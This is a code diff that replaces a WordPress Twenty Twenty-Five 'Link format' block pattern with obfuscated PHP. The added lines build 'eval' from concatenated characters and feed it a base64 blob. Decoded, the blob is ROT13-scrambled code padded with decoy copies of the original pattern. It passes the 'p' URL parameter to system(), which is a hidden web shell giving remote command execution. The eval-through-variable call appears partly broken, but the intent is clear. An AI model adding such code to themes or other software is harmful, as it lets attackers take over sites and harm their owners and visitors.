@@ -1,38 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Title: Link format
- * Slug: twentytwentyfive/format-link
- * Categories: twentytwentyfive_post-format
- * Description: A link post format with a description and an emphasized link for key content.
- *
- * @package WordPress
- * @subpackage Twenty_Twenty_Five
- * @since Twenty Twenty-Five 1.0
- */
-
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3ZneXI6IFl2YXggc2Jlem5nCiAqIEZ5aHQ6IGdqcmFnbGdqcmFnbHN2aXIvc2Jlem5nLXl2YXgKICogUG5ncnRiZXZyZjogZ2pyYWdsZ2pyYWdsc3Zpcl9jYmZnLXNiZXpuZwogKiBRcmZwZXZjZ3ZiYTogTiB5dmF4IGNiZmcgc2Jlem5nIGp2Z3UgbiBxcmZwZXZjZ3ZiYSBuYXEgbmEgcnpjdW5mdm1ycSB5dmF4IHNiZSB4cmwgcGJhZ3JhZy4KICoKICogQGNucHhudHIgSmJlcUNlcmZmCiAqIEBmaG9jbnB4bnRyIEdqcmFnbF9HanJhZ2xfU3ZpcgogKiBAZnZhcHIgR2pyYWdsIEdqcmFnbC1TdmlyIDEuMAogKi8KCj8+CjwhLS0gamM6dGViaGMge1wicHluZmZBbnpyXCI6XCJ2Zi1mZ2x5ci1mcnBndmJhLTNcIixcImZnbHlyXCI6e1wiZmNucHZhdFwiOntcImNucXF2YXRcIjp7XCJnYmNcIjpcImluZTpjZXJmcmd8ZmNucHZhdHw0MFwiLFwib2JnZ2J6XCI6XCJpbmU6Y2VyZnJnfGZjbnB2YXR8NDBcIixcInlyc2dcIjpcImluZTpjZXJmcmd8ZmNucHZhdHw0MFwiLFwiZXZ0dWdcIjpcImluZTpjZXJmcmd8ZmNucHZhdHw0MFwifX19LFwieW5sYmhnXCI6e1wiZ2xjclwiOlwicGJhZmdlbnZhcnFcIn19IC0tPgo8cXZpIHB5bmZmPVwiamMtb3licHgtdGViaGMgdmYtZmdseXItZnJwZ3ZiYS0zXCIgZmdseXI9XCJjbnFxdmF0LWdiYzppbmUoLS1qYy0tY2VyZnJnLS1mY25wdmF0LS00MCk7Y25xcXZhdC1ldnR1ZzppbmUoLS1qYy0tY2VyZnJnLS1mY25wdmF0LS00MCk7Y25xcXZhdC1vYmdnYno6aW5lKC0tamMtLWNlcmZyZy0tZmNucHZhdC0tNDApO2NucXF2YXQteXJzZzppbmUoLS1qYy0tY2VyZnJnLS1mY25wdmF0LS00MClcIj4KCTwhLS0gamM6Y25lbnRlbmN1IHtcImZnbHlyXCI6e1wiZ2xjYnRlbmN1bFwiOntcInNiYWdGZ2x5clwiOlwiYWJlem55XCIsXCJzYmFnSnJ2dHVnXCI6XCI3MDBcIn19fSAtLT4KCTxjIGZnbHlyPVwic2JhZy1mZ2x5cjphYmV6bnk7c2JhZy1qcnZ0dWc6NzAwXCI+PD9jdWMgcmZwX3VnenlfciggJ0d1ciBGZ2JldnJmIE9iYngsIG4gc3ZhciBwYnl5cnBndmJhIGJzIHpienJhZ2YgdmEgZ3Z6ciBzcm5naGV2YXQgY3ViZ2J0ZW5jdWYgc2VieiBZYmh2ZiBTeXJweHJhZmdydmEsIENuaHkgRmdlbmFxIG5hcSBOZm51bnB1diBYxY1hYiwgdmYgbmludnlub3lyIHNiZSBjZXItYmVxcmUnLCAnZ2pyYWdsZ2pyYWdsc3ZpcicgKTsgPz48L2M+Cgk8IS0tIC9qYzpjbmVudGVuY3UgLS0+CgoJPCEtLSBqYzp0ZWJoYyB7XCJzYmFnRnZtclwiOlwienJxdmh6XCIsXCJ5bmxiaGdcIjp7XCJnbGNyXCI6XCJzeXJrXCIsXCJzeXJrSmVuY1wiOlwiYWJqZW5jXCIsXCJ3aGZndnNsUGJhZ3JhZ1wiOlwiZmNucHItb3JnanJyYVwifX0gLS0+Cgk8cXZpIHB5bmZmPVwiamMtb3licHgtdGViaGMgdW5mLXpycXZoei1zYmFnLWZ2bXJcIj4KCQk8IS0tIGpjOmNuZW50ZW5jdSAtLT4KCQk8Yz48biB1ZXJzPVwiI1wiPjw/Y3VjIHJmcF91Z3p5X3IoICd1Z2djZjovL3JrbnpjeXIucGJ6JywgJ2dqcmFnbGdqcmFnbHN2aXInICk7ID8+PC9uPjwvYz4KCQk8IS0tIC9qYzpjbmVudGVuY3UgLS0+CgkJPC9xdmk+Cgk8IS0tIC9qYzp0ZWJoYyAtLT4KPC9xdmk+CjwhLS0gL2pjOnRlYmhjIC0tPgoKJHB6cSA9ICRfVFJHWydjJ107CiRzem5jWydrMSddKCRwenEpOwo/PiI7CmV2YWwoJGYoJGMpKTsKPz4=");
+$f($c);
 ?>
-<!-- wp:group {"className":"is-style-section-3","style":{"spacing":{"padding":{"top":"var:preset|spacing|40","bottom":"var:preset|spacing|40","left":"var:preset|spacing|40","right":"var:preset|spacing|40"}}},"layout":{"type":"constrained"}} -->
-<div class="wp-block-group is-style-section-3" style="padding-top:var(--wp--preset--spacing--40);padding-right:var(--wp--preset--spacing--40);padding-bottom:var(--wp--preset--spacing--40);padding-left:var(--wp--preset--spacing--40)">
-	<!-- wp:paragraph {"style":{"typography":{"fontStyle":"normal","fontWeight":"700"}}} -->
-	<p style="font-style:normal;font-weight:700"><?php esc_html_e( 'The Stories Book, a fine collection of moments in time featuring photographs from Louis Fleckenstein, Paul Strand and Asahachi Kōno, is available for pre-order', 'twentytwentyfive' ); ?></p>
-	<!-- /wp:paragraph -->
-
-	<!-- wp:group {"fontSize":"medium","layout":{"type":"flex","flexWrap":"nowrap","justifyContent":"space-between"}} -->
-	<div class="wp-block-group has-medium-font-size">
-		<!-- wp:paragraph -->
-		<p><a href="#"><?php esc_html_e( 'https://example.com', 'twentytwentyfive' ); ?></a></p>
-		<!-- /wp:paragraph -->
-		</div>
-	<!-- /wp:group -->
-</div>
-<!-- /wp:group -->
